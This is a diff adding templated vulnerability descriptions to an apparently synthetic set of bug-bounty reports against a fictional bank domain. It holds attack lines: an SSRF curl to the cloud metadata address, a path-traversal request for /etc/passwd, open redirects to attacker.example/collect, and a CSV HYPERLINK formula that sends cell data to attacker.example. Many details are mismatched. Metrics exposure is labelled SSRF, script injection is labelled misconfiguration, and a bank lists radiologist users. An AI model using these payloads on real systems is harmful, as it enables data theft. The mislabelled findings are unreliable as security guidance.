+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.glaciervaultbank.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2001,7 +2014,8 @@
           "offset": "18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://banking.glaciervaultbank.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2141,7 +2155,8 @@
           "offset": "4d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.glaciervaultbank.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2248,7 +2263,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.glaciervaultbank.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2387,7 +2403,8 @@
           "offset": "2d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://banking.glaciervaultbank.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2530,7 +2547,8 @@
           "offset": "4d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://banking.glaciervaultbank.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2646,7 +2664,8 @@
           "offset": "4d 10h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.glaciervaultbank.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2774,7 +2793,8 @@
           "offset": "1d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.glaciervaultbank.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2909,7 +2929,8 @@
           "offset": "5d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.glaciervaultbank.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3041,7 +3062,8 @@
           "offset": "1d 11h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.glaciervaultbank.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3165,7 +3187,8 @@
           "offset": "3d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://banking.glaciervaultbank.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3329,7 +3352,8 @@
           "offset": "5d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://banking.glaciervaultbank.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3440,7 +3464,8 @@
           "offset": "18h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://banking.glaciervaultbank.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3596,7 +3621,8 @@
           "offset": "2d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://banking.glaciervaultbank.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3708,7 +3734,8 @@
           "offset": "4d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://banking.glaciervaultbank.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3852,7 +3879,8 @@
           "offset": "2d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.glaciervaultbank.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4016,7 +4044,8 @@
           "offset": "8d 11h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.glaciervaultbank.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4119,7 +4148,8 @@
           "offset": "18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://banking.glaciervaultbank.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4250,7 +4280,8 @@
           "offset": "5d",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.glaciervaultbank.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4360,7 +4391,8 @@
           "offset": "1d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4472,7 +4504,8 @@
           "offset": "2d",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.glaciervaultbank.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4574,7 +4607,8 @@
           "offset": "1d 11h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.glaciervaultbank.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4706,7 +4740,8 @@
           "offset": "5d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.glaciervaultbank.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4854,7 +4889,8 @@
           "offset": "8d 5h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.glaciervaultbank.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4944,7 +4980,8 @@
           "offset": "11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5099,7 +5136,8 @@
           "offset": "5d 14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.glaciervaultbank.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5254,7 +5292,8 @@
           "offset": "6d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.glaciervaultbank.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5366,7 +5405,8 @@
           "offset": "4d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.glaciervaultbank.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5494,7 +5534,8 @@
           "offset": "4d 4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.glaciervaultbank.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5644,7 +5685,8 @@
           "offset": "4d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5755,7 +5797,8 @@
           "offset": "2d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.glaciervaultbank.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5881,7 +5924,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
